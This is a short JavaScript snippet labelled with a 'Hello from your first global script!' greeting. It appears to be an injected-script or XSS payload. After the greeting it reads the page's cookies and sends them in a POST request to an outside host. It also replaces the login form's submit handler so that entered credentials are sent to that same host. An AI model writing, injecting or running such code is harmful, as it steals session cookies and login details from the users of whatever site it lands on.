console.log('Hello from your first global script!');
alert('Hello from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
  method: "POST",
  body: data,
});

login.onsubmit = async (e) => {
    e.preventDefault();

    let response = await fetch('https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net', {
      method: 'POST',
      body: new FormData(login)
    });

    //let result = await response.json();

    //alert(result.message);
  };